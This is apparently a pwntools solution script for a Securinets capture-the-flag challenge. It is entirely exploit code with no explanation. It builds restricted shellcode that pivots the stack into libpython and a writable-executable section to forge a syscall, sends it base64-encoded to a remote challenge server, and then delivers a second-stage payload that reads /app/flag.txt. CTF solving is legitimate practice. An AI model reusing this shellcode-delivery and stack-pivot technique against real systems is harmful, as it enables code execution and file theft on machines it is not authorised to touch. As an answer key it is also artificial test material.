from pwn import *
context.arch = 'amd64'

popn = lambda n: "\n".join(["pop rbx" for _ in range(n)])

sc = f"""
// relocate stack to libpython.so
{popn(16)}
pop rsp

// r12 = 5
pop r12

// rdx = 0xffffffff
pop rdx
pop rdx
pop rdx
pop rdx

push r11
pop rsi

// relocate stack to rwx section
push r11
pop rsp

// shift stack a bit so we can push 0x05 and make a syscall instruction
{popn(0x6)}

push r12

// just alignment
pop rbx
pop rbx

push fs
int3
"""

io = remote("pwn-14caf623.p1.securinets.tn", 9090)
# io = remote("localhost", 5000)
io.recvuntil(b"Shellcode : ")
io.sendline(base64.b64encode(asm(sc)))

# stage2:
sc = "nop\n" * 0x40 + shellcraft.cat("/app/flag.txt")
io.send(asm(sc))


io.interactive()
